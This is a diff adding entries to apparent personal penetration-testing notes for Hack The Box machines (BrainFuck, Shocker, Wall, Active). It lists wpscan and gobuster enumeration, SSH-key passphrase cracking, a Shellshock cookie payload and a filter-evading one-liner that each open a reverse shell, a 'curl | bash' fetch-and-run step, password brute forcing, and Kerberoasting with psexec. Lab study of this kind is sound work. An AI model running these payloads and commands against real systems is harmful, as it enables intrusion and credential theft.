@@ -1,3 +1,5 @@
+>>> Choose a topic: https://ippsec.rocks/
+
 
 [*] Windows Bastion - https://www.youtube.com/watch?v=2j3FNp5pjQ4&list=PLidcsTyj9JXL4Jv6u9qi8TcUgsNoKKHNn
 
@@ -141,7 +143,72 @@
 [*] Linux BrainFuck - https://www.youtube.com/watch?v=o5x1yg3JnYI&list=PLywtf_SEbeFG12GbEmASYkYIAIPMPxvFB
 
 	-> wpscan -u https://brainfuck.htb --disable-tls-checks
-	->
+	-> wpscan -u https://brainfuck.htb --disable-tls-checks --enumerate u
+
+	-> WP Support Plus Responsive Ticket System 7.1.3 Privilege Escalation
+
+	-> SMTP Mail Evolution set the server to brainfuck.htb
+	
+	-> ./sshng2john.py /root/id_rsa > /root/brainfuck-crack
+	-> ./john /root/brainfuck-crack --wordlist=/opt/wordlist/rockyou.txt 					(crack the ssh key passphrase)
+
+
+[*] Linux Shocker - https://www.youtube.com/watch?v=IBlTdguhgfY&list=PLywtf_SEbeFG12GbEmASYkYIAIPMPxvFB&index=2
+
+	-> /opt/gobuster/gobuster -u http://10.10.10.56 -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403
+	-> /opt/gobuster/gobuster -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/small.txt -s 302,307,200,204,301,403 -x sh,pl
+
+	-> locate nse |grep shellshock
+	-> nmap -sV -p80 --script http-shellshock --script-args uri=/cgi-bin/user.sh,cmd=ls 10.10.10.56
+	-> debug nmap script: modify proxy in Burp
+
+	-> Cookie: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+
+	-> Lin Enum scripts: /opt/linux_privesc/ 
+	-> curl 10.10.10.56:8083/LinEnum.sh | bash
+
+	-> /usr/bin/perl -e 'exec("/bin/bash")'
+
+
+[*] Linux? Wall - https://www.youtube.com/watch?v=SyWUsN0yHKI
+
+	-> wfuzz -u http://10.10.10.157/centreon/api/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/seclists/Passwords/	darkweb2017-top1000.txt --hc 403
+
+	-> echo "bash -c 'bash -i >& /dev/tcp/10.10.14.3/9001 0>&1'" | sed 's/ /${IFS}/g'
+
+	-> background shell: CRTL+Z
+	-> stty raw -echo
+	-> nc -lvnp 9001
+	-> (In the shell): export TERM=xterm
+	-> (in the shell): stty rows 35
+	-> (in the shell): stty columns 137
+
+	-> grep -R -i '$_[GPR].*\[' .
+	
+
+[*] Windows Active - https://www.youtube.com/watch?v=jUc1J31DNdw&t=1560
+
+	-> smbclient -L //10.10.10.100
+	-> enum4linux 10.10.10.100
+	-> smbmap -H 10.10.10.100
+
+	-> smbmap -d active.htb -u svc_tgs -p mypassword -H 10.10.10.100 -R Users
+
+	-> C:\> runas /netonly /user:TestUser cmd
+	-> C:\> powershell
+	-> C:\> Test-NetConnection -ComputerName 10.10.10.100 -Port 389
+	-> C:\> .\SharpHound.exe -c all -d active.htb --domaincontroller 10.10.10.100
+
+	-> GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/svc_tgs
+	-> psexec.py active.htb/Administrator@10.10.10.100
+
+
+
+
+
+
+	
+
 
 
 
